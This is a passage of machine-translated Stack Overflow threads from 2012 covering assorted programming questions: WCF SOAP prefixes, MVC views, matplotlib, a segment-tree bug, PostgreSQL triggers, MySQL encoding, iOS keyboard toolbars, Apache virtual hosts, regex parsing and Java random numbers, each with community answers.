<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"  
                  xmlns:tem="http://tempuri.org/">
            <soapenv:Header/>
            <soapenv:Body>
               <NewOrder>
                  <Message id="d3a39c31-cc9f-4331-ad13-be74522df6eb">
                     <Header>
                        <LoginAccountIdentifier>Blank</LoginAccountIdentifier>
                        <LoginAccountPassword>password</LoginAccountPassword>
                     </Header> 
```

我注意到我的预期格式除了前缀 tem: 在节点上。

这是预期的消息：

```
 <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                      xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:NewOrder>
         <tem:Message id="d3a39c31-cc9f-4331-ad13-be74522df6eb ">
            <Header>
               <LoginAccountIdentifier>Blank</LoginAccountIdentifier>
               <LoginAccountPassword>password</LoginAccountPassword>
            </Header> 
```

我相信，如果我可以删除前缀，那么这应该将客户端的消息与预期的消息相匹配。问题是我在哪里删除前缀“< tem:”；此外，如何防止此变量 xmlns:tem="http://tempuri.org/" 出现在我的文档中？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-18T19:02:36.937

我很久以前遇到过类似的问题。尝试使用这个：

```
[ServiceContract(Namespace = "")] 
```

显然，前缀是由命名空间决定的，所以如果你想删除它，那么这就是要走的路。

祝你好运！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T19:00:16.883

I'm pretty sure that's from the WebService.svc (or .asmx) class having a `[WebService(Namespace = "http://tempuri.org/")]` attribute at the top of the class definition. Removing this (or setting it to an appropriate value) should remedy the problem.

# c# - MVC3.0+c#+razor：如何创建一个显示帖子和评论创建部分的页面

> ID：10658268
> 
> 赞同：1
> 
> 时间：2012-05-18T18:56:17.143
> 
> 标签：c#, asp.net-mvc, entity-framework, razor

我正在尝试使用 mvc 创建一个博客。我先用 EF 做了一个数据库代码。现在我有一个页面，您可以在其中每页看到一篇文章。下面我想显示该帖子的所有评论。这一切都很好。但现在我想在同一页面上创建一个创建评论功能。

我不知道该怎么做？因为这必须创建一个新对象“评论”而不是我在视图中设置为模型的“帖子”对象。所以我认为我有不同的模型？我不认为这是可能的，对吧？也许我可以只使用“发布”模型，因为它有评论作为列表<>？

我需要为此使用部分视图还是模型视图？

希望你知道我的意思和我想要完成的事情。提前 Tnx 寻求帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T19:02:27.827

If your `Post` model contains a `List<Comment>` then you could of course use that. Even if you do go that route, using a ViewModel to wrap all of your model objects is never a bad idea.

Simply for the sake of maintainability, I would use partial views for the different models rendered on your page, but that's is purely a matter of personal preference.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T20:23:31.430

是的，您可以通过使用局部视图来做到这一点。制作一个将评论发布到服务器的部分视图。在评论列表下方显示此部分视图。当用户发布评论时，然后通过 json 调用提交评论，成功后制作 html 评论字符串并将其附加到评论列表中。这样，您的评论将被发布并加载到评论列表中，而无需重新加载整个模型

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-18T19:02:42.697

您的帖子应该有某种评论集合。您应该能够只添加一个非模型绑定的表单；在你的控制器中，你有你的`collection`，只需从中提取数据。

我的意思是：在你看来，你会有类似的东西

`@Html.TextArea("CommentText")`

在您的控制器中：

```
public ActionResult Create(FormCollection collection) {
  string commentText = collection["CommentText"];
  Post p = ... ; // Not familiar with EF
  p.Comments.Add(new Comment(commentText));
  p.Save(); // ActiveRecord style, not sure about EF
} 
```

它应该很简单。我在 NHibernate 上使用 ActiveRecord，所以我不确定实体框架。您是否遇到了一些具体问题？

# python - Python基于csv文件绘制时间与数据包

> ID：10658271
> 
> 赞同：1
> 
> 时间：2012-05-18T18:56:23.733
> 
> 标签：python, csv, graph, numpy, matplotlib

我在这样的文本文件中有一堆数据：

```
99150, 2012-05-18 14:30:08.592276
100350, 2012-05-18 14:31:09.093357
97710, 2012-05-18 14:32:09.583485
94980, 2012-05-18 14:33:10.047794
95670, 2012-05-18 14:34:10.559798
97170, 2012-05-18 14:35:11.073576
98850, 2012-05-18 14:36:11.562930
98280, 2012-05-18 14:37:12.058591
97950, 2012-05-18 14:38:12.547585
102510, 2012-05-18 14:39:13.053431 
```

我想对其进行简单的绘图并输出图像。我从以下开始：

```
#!/bin/python

import csv
import matplotlib.pyplot as plt
import numpy as np

filename="pps_counter.log"

def getColumn(filename, column):
    results = csv.reader(open(filename), delimiter=",")
    return [result[column] for result in results]

time = getColumn(filename,1)
packets = getColumn(filename,0)

plt.figure("Packets Per Minute")
plt.xlabel("Time(minutes)")
plt.ylabel("Number of Packets")
plt.plot(time,packets) 
```

当我运行它时，我收到以下错误：

```
Traceback (most recent call last):
  File "plotter.py", line 16, in <module>
    time = getColumn(filename,1)
  File "plotter.py", line 14, in getColumn
    return [result[column] for result in results]
IndexError: list index out of range 
```

任何人都可以帮忙吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T21:44:28.070

我建议使用[csv2rec](http://matplotlib.sourceforge.net/api/mlab_api.html#matplotlib.mlab.csv2rec)（或带有转换器功能的 genfromtxt ）。这会将时间转换为 python 日期时间，您可以使用`matplotlib`.

```
from matplotlib.mlab import csv2rec
import matplotlib.pyplot as plt 

data = csv2rec('pps_counter.log', names=['packets', 'time'])

plt.plot_date(data['time'], data['packets'])
plt.xlabel("Time(minutes)")
plt.ylabel("Number of Packets")
plt.title("Packets Per Minute")

plt.show() 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T19:06:58.373

我会使用一些错误检查，例如

```
return [ result[column] if column < len( result ) else None for result in results] 
```

看起来您的文件中有一行缺少`,`

# php - aptana studio 3，识别php文件

> ID：10658272
> 
> 赞同：0
> 
> 时间：2012-05-18T18:56:24.773
> 
> 标签：php, aptana, aptana3

aptana 识别模板文件并有不同的颜色

但是当我打开一个php文件时，颜色都是一样的

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-16T08:23:53.307

1.检查首选项：常规>编辑>文件关联

*.php 文件是否与 php 编辑器相关联？

2.检查首选项：常规>内容类型

PHP 内容类型是否包含 *.php 文件？

# c++ - 象限查询

> ID：10658280
> 
> 赞同：1
> 
> 时间：2012-05-18T18:57:18.220
> 
> 标签：c++, c, algorithm, data-structures

我几乎已经使用延迟传播的分段树解决了 Interviewstreet 的这个象限查询问题，但我仍然得到错误的答案，所以我需要我的代码帮助。

这是问题：

象限查询

平面上有 N 个点。第 i 个点具有坐标 (xi, yi)。执行以下查询：

1.  反射点 i 和 j 之间的所有点，包括沿 X 轴。此查询表示为`X i j`
2.  反映点 i 和 j 之间的所有点，包括沿 Y 轴。此查询表示为`Y i j`
3.  计算点 i 和 j 之间有多少点，包括位于 4 个象限中的每一个。此查询表示为`C i j`

## 输入：

第一行包含 N，点数。接下来是 N 行。

第 i 行包含由空格分隔的 xi 和 yi。

下一行包含 Q 查询数。接下来的 Q 行每行包含一个查询，采用上述形式之一。

所有索引均为 1 索引。

## 输出：

为类型的每个查询输出一行`C i j`。对应的行包含 4 个整数；分别在第 1、2、3 和 4 象限中具有 [i..j] 范围内索引的点数。

## 约束：

```
1 <= N <= 100000
1 <= Q <= 100000
You may assume that no point lies on the X or the Y axis.
All (xi,yi) will fit in a 32-bit signed integer
In all queries, 1 <=i <=j <=N 
```

## 样本输入：

```
4
1 1
-1 1
-1 -1
1 -1
5
C 1 4
X 2 4
C 3 4
Y 1 2
C 1 3 
```

## 样本输出：

```
1 1 1 1
1 1 0 0
0 2 0 1 
```

## 解释：

当查询说`X i j`时，这意味着获取索引 i 和 j 之间的所有点，包括并反映沿 X 轴的这些点。这里的 i 和 j 与点的坐标无关。它们是指数。i 指 i 点， j 指 j 点

`C 1 4`要求您“考虑索引在 {1,2,3,4} 中的点集。在这些点中，有多少分别位于第 1、第 2、第 3 和第 4 个四边形中？答案显然是 1 1 1 1。

接下来，我们沿 X 轴反映索引“2 4”之间的点。所以新的坐标是：

```
1 1
-1 -1
-1 1
1 1 
```

现在`C 3 4`是'考虑在 {3,4} 中具有索引的点集。在这些点中，有多少分别位于第 1、第 2、第 3 和第 4 个四边形中？第 3 点在第 2 象限，第 4 点在第 1 象限。所以答案是 1 1 0 0。

## 当前代码

这是我在c中的解决方案：

```
void query(int node, int b, int e, int i, int j, char ch)
{

      if(L[node][0]!=0 || L[node][1]!=0)
    {
      if(b!=e){
      L[2*node+1][0]=L[node][0];
      L[2*node+1][1]=L[node][1];
      L[2*node+2][0]=L[node][0];
      L[2*node+2][1]=L[node][1];
      }
      if(L[node][0]%2!=0)
      {
      tmp=Q[node][0];
      Q[node][0]=Q[node][3];
      Q[node][3]=tmp;

      tmp=Q[node][1];
      Q[node][1]=Q[node][2];
      Q[node][2]=tmp;
      }
      if(L[node][1]%2!=0)
      {
      tmp=Q[node][0];
      Q[node][0]=Q[node][1];
      Q[node][1]=tmp;

      tmp=Q[node][2];
      Q[node][2]=Q[node][3];
      Q[node][3]=tmp;
      }
      L[node][0]=0;
      L[node][1]=0;

    }

      if (i > e || j < b)
          return ;

      if (b >= i && e <= j)
      {
    if(ch == 'C'){
    ans[0]+=Q[node][0];
    ans[1]+=Q[node][1];
    ans[2]+=Q[node][2];
    ans[3]+=Q[node][3];
    }
    if(ch == 'X')
    {
      if(b!=e){
      L[2*node+1][0]++;
      L[2*node+2][0]++;
      }
      tmp=Q[node][0];
      Q[node][0]=Q[node][3];
      Q[node][3]=tmp;
      tmp=Q[node][1];
      Q[node][1]=Q[node][2];
      Q[node][2]=tmp;
    }
    if(ch == 'Y')
    {
      if(b!=e){
      L[2*node+1][1]++;
      L[2*node+2][1]++;
      }
      tmp=Q[node][0];
      Q[node][0]=Q[node][1];
      Q[node][1]=tmp;
      tmp=Q[node][2];
      Q[node][2]=Q[node][3];
      Q[node][3]=tmp;
    }
    return ;
      }

       query(2 * node +1, b, (b + e) / 2, i, j,ch);
      query(2 * node + 2, (b + e) / 2 + 1, e, i, j,ch);

    Q[node][0]=Q[2*node+1][0] + Q[2*node+2][0];
    Q[node][1]=Q[2*node+1][1] + Q[2*node+2][1];
    Q[node][2]=Q[2*node+1][2] + Q[2*node+2][2];
    Q[node][3]=Q[2*node+1][3] + Q[2*node+2][3];
    return ;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T19:25:47.333

如果我正确理解您的算法，您将使用 L 数组来跟踪是否需要翻转一系列点，但将实际翻转推迟到必要时。

在这种情况下，我认为这些行可能有问题：

```
void query(int node, int b, int e, int i, int j, char ch)
{
  if(L[node][0]!=0 || L[node][1]!=0)
  {
    if(b!=e){
      L[2*node+1][0]=L[node][0];
      L[2*node+1][1]=L[node][1];
      L[2*node+2][0]=L[node][0];
      L[2*node+2][1]=L[node][1];
    } 
```

假设 L[node][0] 为 1，而 L[2*node+1][0] 已经为 1。这意味着上一步想要翻转 2*node+1 处的节点，然后这一步也想要翻转这些节点。这些翻转应该取消，L[2*node+1][0] 应该变为零。

我认为您应该更改这些行以使用 xor 以便取消双翻转：

```
void query(int node, int b, int e, int i, int j, char ch)
{
  if(L[node][0]!=0 || L[node][1]!=0)
  {
    if(b!=e){
      L[2*node+1][0]^=L[node][0];
      L[2*node+1][1]^=L[node][1];
      L[2*node+2][0]^=L[node][0];
      L[2*node+2][1]^=L[node][1];
    } 
```

（或者也许我误解了这种方法！）

# android - Android ListView 图像调整大小

> ID：10658282
> 
> 赞同：0
> 
> 时间：2012-05-18T18:57:20.650
> 
> 标签：android, listview

我有一个延迟加载的 ListView，其中填充了通过网络获取的图像。列表行设置为 wrap_content，因此一旦加载图像，它就会调整大小并显示全尺寸图像。向下滚动时看起来很棒，但是向上滚动行时会调整大小并强制底部行离开屏幕。如何在向上滚动时防止这种跳跃的滚动？

- - - 编辑：

这些图像是不同大小的漫画。有些是 2 或 3 帧，它们不是很高。其他的是单帧漫画，它们要高得多。图片需要占据整个宽度，高度不应该切断任何漫画。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T19:00:00.650

假设所有下载的图像预计大小相同，大多数开发人员使用的一个好的解决方案是使用“虚拟”图像，直到加载真实图像。该图像将存在于本地，因此几乎可以立即加载。在该`getView`方法中，显示这个虚拟图像，直到下载了真实图像，然后简单地替换它。这将防止您的行调整大小。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T19:32:08.437

你必须看到这个[链接](http://www.ryangmattison.com/post/2011/12/15/AsynchronousImageProvider.aspx)它在后台线程中下载图像。图像被缓存在 SD 卡和内存中，它使用 inSampleSize 解码图像以减少内存消耗并尝试正确处理回收的视图。当图像未完全下载时播放假图像。“对不起音乐！！”

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T15:07:31.470

我想出了解决方案。当我收到图像时，我从父级获取宽度，然后将图像视图的高度设置为 parentWidth * bitmapHeight / bitmapWidth。这样，在创建行视图时会发生调整大小，并且一旦我知道位图的大小，列表就不会跳动太多。

# sql - Postgresql 触发通知

> ID：10658286
> 
> 赞同：1
> 
> 时间：2012-05-18T18:57:32.760
> 
> 标签：sql, postgresql

请帮我纠正sql语句：

```
CREATE TRIGGER transaction_insert
    AFTER INSERT ON transaction
    FOR EACH ROW
    WHEN (NEW.tr_type = 55)
    EXECUTE PROCEDURE pg_notify('check_close', to_char(NEW.n_transaction, 999999)); 
```

添加行时我需要收到通知`tr_type=55`。 `tr_type`是`int`。n_transaction 是`int`.

PostgreSQL 8.3.4

请帮忙！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T19:04:28.107

尝试以下操作：

```
CREATE TRIGGER transaction_insert
    AFTER INSERT ON transaction
    FOR EACH ROW EXECUTE PROCEDURE transaction_insert_check_close();

CREATE OR REPLACE FUNCTION transaction_insert_check_close() RETURNS TRIGGER AS $transaction_insert_check_close$
BEGIN
    IF (NEW.tr_type = 55) THEN
        PERFORM pg_notify('check_close', to_char(NEW.n_transaction, 999999));
    END IF;

    RETURN NEW;
END;

$transaction_insert_check_close$ LANGUAGE plpgsql; 
```

# r - R gsub 添加前导换行符

> ID：10658290
> 
> 赞同：1
> 
> 时间：2012-05-18T18:57:53.273
> 
> 标签：r, gsub

我需要在 R 中的轴标签名称列表中添加前导换行符“\n”。我无法弄清楚如何使用 gsub 执行此操作。例如，我需要“Q1\n/\n15”来读取“\nQ1\n/\n15”。谷歌和帮助命令都没有引导我找到答案。有什么建议吗？

提前致谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-18T21:26:57.343

所以评论中大约有 4 个答案（截至撰写本文时），所以我将把它们总结为一个正确的答案。

```
examp <- "Q1\n/\n15"

paste("\n", examp, sep="")
gsub("^(.)","\n\\1",examp)
sprintf("\n%s", examp)
gsub("^", "\n", examp) 
```

所有这些都给

```
[1] "\nQ1\n/\n15" 
```

并且所有这些都被正确地矢量化了（也就是说，如果`examp <- c("Q1\n/\n15", "Q1\n/\n16")`，都返回`[1] "\nQ1\n/\n15" "\nQ1\n/\n16"`.

# python - 国际化 - Python MySQLDb 和 ISO-8859-7

> ID：10658292
> 
> 赞同：0
> 
> 时间：2012-05-18T18:58:24.957
> 
> 标签：python, mysql, internationalization, mysql-python

我编写了一个 python 脚本来解析 HTML 页面，获取一些字符串，然后写入 mysql 表。我正在使用该`MySQLDb`模块进行数据库连接。检索到的字符串以 ISO-8859-7（希腊语）编码，这也是 MySQL 表中的默认编码。产生异常的代码如下：

```
 def db_write(list) :
    import MySQLdb as sql
    try :
        con = sql.connect(//database info here//)
    except :
        print "could not connect to database"
        exit()
    cur = con.cursor()
    for i in my_range (8,len(list)-2,2) :
        query = 'INSERT INTO as_doy VALUES (%s,"%s")' % (list[i],list[i+1])
        print query        
        try :
            cur.execute(query)
            con.commit()
        except :
            print "failed"
            con.rollback()
    con.close() 
```

我得到的例外是`ERROR 1366 (HY000): Incorrect string value: '\xEF\xBF\xBD\xEF\xBF\xBD...'`

我试过用 utf-8 编码字符串，用 iso-8859-7 解码和重新编码，但对我来说还没有任何效果。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T19:05:36.713

在运行任何查询之前，通过将`charset`参数传递给`.connect()`或执行（或等效）来确保您的连接排序规则是正确的。`SET NAMES utf8`

有关更多提示，请参阅[此链接](http://mysql.rjweb.org/doc.php/charcoll)。

# cocoa-touch - 将自定义 UIButton 添加到 UIKeyboard 的 UIWebView 的附件视图

> ID：10658300
> 
> 赞同：1
> 
> 时间：2012-05-18T18:59:03.397
> 
> 标签：cocoa-touch, uikeyboard

我需要将相机按钮添加到 a`UIWebView`的键盘附件视图工具栏（已经具有“返回|下一步”和“完成”按钮的工具栏）。

是否有捷径可寻？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T19:15:12.400

我仍在寻找一种更好的方法来做到这一点，但目前的一种解决方案是破坏酒吧并像这样重新创建它：

```
- (void)viewDidLoad
{
    [super viewDidLoad];

    UIWebView *web = [[UIWebView alloc] initWithFrame:CGRectMake(0, 0, 320, 480)];
    NSURL *aURL = [NSURL URLWithString:@"http://www.google.com"];
    NSURLRequest *aRequest = [NSURLRequest requestWithURL:aURL];
    [web loadRequest:aRequest];
    [self.view addSubview:web];

    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(keyboardWillShow:) name:UIKeyboardWillShowNotification object:nil];
}

- (void)keyboardWillShow:(NSNotification *)notification {
    [self performSelector:@selector(removeBar) withObject:nil afterDelay:0];
}

- (void)removeBar {
    UIWindow *keyboardWindow = nil;
    for (UIWindow *testWindow in [[UIApplication sharedApplication] windows]) {
        if (![[testWindow class] isEqual:[UIWindow class]]) {
            keyboardWindow = testWindow;
            break;
        }
    }

    for (UIView *possibleFormView in [keyboardWindow subviews]) {
        // iOS 5 sticks the UIWebFormView inside a UIPeripheralHostView.
        if ([[possibleFormView description] rangeOfString:@"UIPeripheralHostView"].location != NSNotFound) {
            for (UIView *subviewWhichIsPossibleFormView in [possibleFormView subviews]) {
                if ([[subviewWhichIsPossibleFormView description] rangeOfString:@"UIWebFormAccessory"].location != NSNotFound) {

                    UISegmentedControl *nav = [[UISegmentedControl alloc] initWithItems:[NSArray arrayWithObjects:@"Previous",@"Next", nil]];
                    nav.momentary = YES; 
                    nav.frame = CGRectMake(5, 8, 120, 30); 
                    nav.segmentedControlStyle = UISegmentedControlStyleBar;
                    nav.tintColor = [UIColor colorWithWhite:0.25 alpha:1];
                    [nav addTarget:self action:@selector(navigate) forControlEvents:UIControlEventValueChanged];

                    UIBarButtonItem *pictureBtn =[[UIBarButtonItem alloc] initWithTitle:@"Picture" style:UIBarButtonItemStyleBordered target:self action:@selector(takePic:)];

                    UIBarButtonItem *flexButton = [[UIBarButtonItem alloc] initWithBarButtonSystemItem:UIBarButtonSystemItemFlexibleSpace target:self action:nil];
                    UIBarButtonItem *doneButton =[[UIBarButtonItem alloc] initWithBarButtonSystemItem:UIBarButtonSystemItemDone target:self action:@selector(resignKeyboard)];

                    NSArray *buttons = [NSArray arrayWithObjects:flexButton,pictureBtn,flexButton,doneButton, nil];
                    [(UIToolbar *)subviewWhichIsPossibleFormView addSubview:nav];
                    [(UIToolbar *)subviewWhichIsPossibleFormView setItems:buttons];

                }
            }
        }
    }
} 
```

但是，您必须再次实现上一个、下一个和完成功能。但这还不是最难的部分。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-26T22:03:37.300

有一种更简单的方法可以做到这一点。

将键盘通知保存在您的`viewDidLoad`

之后，您将需要以下方法：

```
-(void)keyboardDidShow:(NSNotification*)notif
{
    NSArray *array = [[UIApplication sharedApplication] windows];

    for (UIWindow* wind in array) {
        for (UIView* currView in wind.subviews) {
            if ([[currView description] hasPrefix:@"<UIPeripheralHostView"]) {
                for (UIView* perView in currView.subviews) {
                    if ([[perView description] hasPrefix:@"<UIWebFormAccessory"]) {

                        UIBarButtonItem *doneBttn = [[UIBarButtonItem alloc] initWithBarButtonSystemItem:UIBarButtonSystemItemDone target:self action:@selector(resignKeyBoard)];

                        NSMutableArray *arr = [[NSMutableArray alloc] initWithArray: [(UIToolbar *) perView items]];

                    [arr addObject:doneBttn];

                    [(UIToolbar *) perView setItems:arr];
                    }
                }

            }
        }
    }
} 
```

我基本上已经从 UIWebFormAccessory 中获取了原始的上一个/下一个按钮，并在其末尾添加了一个完成按钮，但是您可以添加任何您想要的按钮。

有些人可能认为这不应该实现，`-(void)keyboardDidShow:`因为您在 UI 显示在屏幕上后更改它，但到目前为止我还没有注意到这有任何问题。（仅在模拟器中测试）

希望这很有用！

# apache - 为本地开发设置子域

> ID：10658304
> 
> 赞同：0
> 
> 时间：2012-05-18T18:59:21.137
> 
> 标签：apache, xampp, virtual-hosts

我为本地开发安装了 XAMPP，我想为每个项目创建一个子域。在我的 apache vhosts 配置中，我放了这个：

```
<VirtualHost localhost:80>
DocumentRoot C:/xampp/htdocs/
ServerName localhost
ServerAdmin admin@localhost
</VirtualHost>

<VirtualHost nexus.localhost:80>
DocumentRoot C:/xampp/htdocs/nexus/
ServerName nexus.localhost
ServerAdmin admin@nexus.localhost
</VirtualHost> 
```

在我的 Windows 主机文件中：

```
# development
127.0.0.1 localhost
127.0.0.1 nexus.localhost 
```

localhost 正常工作。如在，如果我去`http://localhost/project_name`一切正常。但是，如果我导航到`http://nexus.localhost/`我只会得到`Object not found!`错误。

这里有什么问题？谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T19:17:17.813

文档[http://httpd.apache.org/docs/2.2/mod/core.html#virtualhost](http://httpd.apache.org/docs/2.2/mod/core.html#virtualhost)说`<VirtualHost>`指令应该包含 IP 地址，所以试试这个：

```
<VirtualHost 127.0.0.1:80>
DocumentRoot C:/xampp/htdocs/
ServerName localhost
ServerAdmin admin@localhost
</VirtualHost>

<VirtualHost 127.0.0.1:80>
DocumentRoot C:/xampp/htdocs/nexus/
ServerName nexus.localhost
ServerAdmin admin@nexus.localhost
</VirtualHost> 
```

# python - Python中的字符分组

> ID：10658305
> 
> 赞同：1
> 
> 时间：2012-05-18T18:59:23.277
> 
> 标签：python, regex, string

在插入数据库之前，我有一些需要清理的数据。每行代表一个出版物，其中一些具有不同的格式。唯一的相似之处是每条记录都在同一行。例如。

```
5: Aghasadeghi MR, Salmani AS, Sadat SM, Javadi F, Memarnejadian A, Vahabpour R, Zabihollahi R, Moshiri A, Siadat SD. Application of outer membrane vesicle ofNeisseria meningitidis serogroup B as a new adjuvant to induce stronglyTh1-oriented responses against HIV-1\. Curr HIV Res. 2011 Dec 1;9(8):630-5\. PubMedPMID: 22211657.
6: Ramezani A; Banifazl M; Mohraz M; Rasoolinejad M; Aghakhani A; Occulthepatitis B virus infection: A major concern in HIV-infected patients: Occult HBVin HIV. Hepat Mon. 2011 Jan 1;11(1):7-10\. PubMed PMID: 22087108; PubMed CentralPMCID: PMC3206662.
7: Roohvand, F., Kossari, N. Advances in hepatitis C virus vaccines, Part one:Advances in basic knowledge for hepatitis C virus vaccine design. Expert OpinTher Pat. 2011 Dec;21(12):1811-30\. Epub 2011 Oct 25\. Review. PubMed PMID:22022980.
8: Chinikar, S., Javadi, A., Ataei, B., Shakeri, H., Moradi, M., Mostafavi, E., Ghiasi, S.M.Detection of West Nile virus genome and specific antibodies in Iranianencephalitis patients. Epidemiol Infect. 2011 Oct 19:1-5\. [Epub ahead of print]PubMed PMID: 22008154. 
```

可以看到，有些作者用分号隔开，有些用逗号隔开。第 7 行和第 8 行用逗号分隔姓氏和中间名的首字母。我想将所有作者分组并将它们放在作者字段中，或者甚至将它们放在自己的列中。将这些作者彼此分开以做到这一点的最佳方法是什么？这不是一件容易的事;-)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-18T19:18:48.850

当格式不一致时，这可能会变得很棘手，因为您需要做出一些假设。我为这个解决方案所做的假设是人们的名字不会超过 20 个字符，并且标题至少有 20 个字符并且不包含逗号、分号或句点。

这是一个在最终作者之后插入标签的版本：

```
result = ''
for line in text.split('\n'):
    result += re.sub(r'([^,;.]{20,}.*)', r'\t\1', line) + '\n' 
```

这是一种获取每本书的作者列表的方法：

```
authors = []
for line in text.split('\n'):
    names = re.split(r'\d+: |[^,;.]{20,}', line)[1]
    authors.append(re.findall(r'\w+,? [\w.]+', names)) 
```

结果：

```
>>> pprint.pprint(authors, width=200)
[['Aghasadeghi MR', 'Salmani AS', 'Sadat SM', 'Javadi F', 'Memarnejadian A', 'Vahabpour R', 'Zabihollahi R', 'Moshiri A', 'Siadat SD.'],
 ['Ramezani A', 'Banifazl M', 'Mohraz M', 'Rasoolinejad M', 'Aghakhani A'],
 ['Roohvand, F.', 'Kossari, N.'],
 ['Chinikar, S.', 'Javadi, A.', 'Ataei, B.', 'Shakeri, H.', 'Moradi, M.', 'Mostafavi, E.', 'Ghiasi, S.M.']] 
```

# java - StackOverflow while generating random numbers without having two numbers fall in a certain range

> ID：10658312
> 
> 赞同：0
> 
> 时间：2012-05-18T18:59:48.680
> 
> 标签：java, stack-overflow

I need to write a program to generate some random numbers without having two numbers fall in a certain range. Unfortunately, I need to do it at school and the only language I can use on the computers is Java (I would otherwise do it in C++). I know very little Java, and my program is giving me a stack overflow after generating 20 or so numbers. Could someone please explain why? The program is somewhat ugly, but I really need it ready in a hurry.

```
import java.io.*;
import java.util.*;

public class RandomNumbers {
public static int GenerateNumber(int previousNumber, int[] numberUsed) {
    Random random = new Random();
    int number = random.nextInt(39);
    if (previousNumber >= 1 && previousNumber <= 9) {
        while (number >= 1 && number <= 9)
            number = random.nextInt(39) + 1;
    } else if (previousNumber >= 10 && previousNumber <= 17) {
        while (number >= 10 && previousNumber <= 17)
            number = random.nextInt(39) + 1;
    } else if (previousNumber >= 18 && previousNumber <= 32) {
        while (number >= 18 && previousNumber <= 32)
            number = random.nextInt(39) + 1;
    } else if (previousNumber >= 33 && previousNumber <= 41) {
        while (number >= 32 && number <= 41)
            number = random.nextInt(39) + 1;
    }
    return number;
}

public static void main(String[] args) {
    int[] numberUsed;
    numberUsed = new int[40];
    for (int i = 0; i < 40; ++i) {
        numberUsed[i] = 0;
    }
    int previousNumber = 0;
    for (int y = 0; y < 40; ++y) {
        int number = 1;
        while (numberUsed[ number = GenerateNumber
                         (previousNumber, numberUsed) ] != 0);
        numberUsed[number] = 1;
        previousNumber = number;
        System.out.println(y);
    }
}
} 
```

EDIT: Okay, so now, for some reason, the for loop (the one with y as a counter) is not running 40 times when I include the while loop. Can someone explain why this is happening?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T19:17:41.393

您的函数最终将无法返回主函数。

您将面临递归问题

```
if (numberUsed[number] != 0) {
    return GenerateNumber(previousNumber, numberUsed);
} 
```

由于数组 get 被 1 填满，这将继续执行函数调用，而不是实际成功返回。它将递归地执行函数，最终导致堆栈溢出。

当您再次调用该函数时，您的参数（previousNumber 和 numberUsed）与上次执行时相同，没有任何变化。你一直遇到同样的问题，因为达到非零的机会是如此之高，所以递归只会永远堆积并最终崩溃。

您应该摆脱函数中的 if 语句，只需将数字返回给 main 并在那里进行检查。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T19:16:10.793

在盯着这个看了一会儿之后，我想我找到了一个可行的解决方案。它仍然很丑陋，但你似乎可以接受。

```
public static int GenerateNumber(int previousNumber, 
                                int[] numberUsed) {
    Random random = new Random();
    int number = random.nextInt(39);
    while (numberUsed[number] != 0) {
        number = random.nextInt(39);
        if (previousNumber >= 1 && previousNumber <= 9) {
            while (number >= 1 && number <= 9)
                number = random.nextInt(39) + 1;
        } else if (previousNumber >= 10 && previousNumber <= 17) {
            while (number >= 10 && previousNumber <= 17)
                number = random.nextInt(39) + 1;
        } else if (previousNumber >= 18 && previousNumber <= 32) {
            while (number >= 18 && previousNumber <= 32)
                number = random.nextInt(39) + 1;
        } else if (previousNumber >= 33 && previousNumber <= 41) {
            while (number >= 32 && number <= 41)
                    number = random.nextInt(39) + 1;
        }
    }
    return number;
} 
```

附带说明一下，当您接近列表末尾时，运行时也会很糟糕，但它不应该堆栈溢出。现在我考虑它可能会无限循环，您可能需要完全重新设计它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-19T20:53:09.783

这是预期的行为吗？“洗牌”

```
 ArrayList<Integer> numbers = new ArrayList<Integer>();
    int[] scrambled = new int[40];
    Random rnd = new Random();
    for(int i=0;i<scrambled.length;i++){
        numbers.add(i+1);
    }
    int idx=0;
    while(!numbers.isEmpty()){
        int pos = rnd.nextInt(numbers.size());

        scrambled[idx] = numbers.get(pos);
        numbers.remove(pos);

        idx++;
    }
    for(int i=0;i<scrambled.length;i++){
        System.out.println(scrambled[i]);
    } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-18T20:13:44.250

此代码检测到死胡同并不断重新启动，直到它到达终点（通常它只重试一两次）。它还直接从收集的允许选择序列中选择一个随机数，因此任何一次尝试都没有随机运行时间。

```
import java.util.Arrays;
import java.util.BitSet;
import java.util.Random;

public class RandomNumberGenerator {
  static final Random random = new Random();
  static final BitSet usedNumbers = new BitSet(40);
  static final int[] ticks = {0, 1, 10, 18, 33, 41};
  static int previousNumber;

  public static int generateNumber() {
    for (int i = 1; i < ticks.length; i++)
      if (previousNumber < ticks[i])
        return generateOutsideRange(ticks[i-1], ticks[i]);
    return generateOutsideRange(0, 0);
  }

  static int generateOutsideRange(int low, int high) {
    final int[] numsToChoose = new int[40];
    int choiceLimit = 0;
    for (int i = (low > 1? 1 : high); i < 41; i = (++i == low? high : i))
      if (!usedNumbers.get(i)) numsToChoose[choiceLimit++] = i;
    if (choiceLimit == 0) throw new CulDeSacException();
    final int r = numsToChoose[random.nextInt(choiceLimit)];
    usedNumbers.set(r);
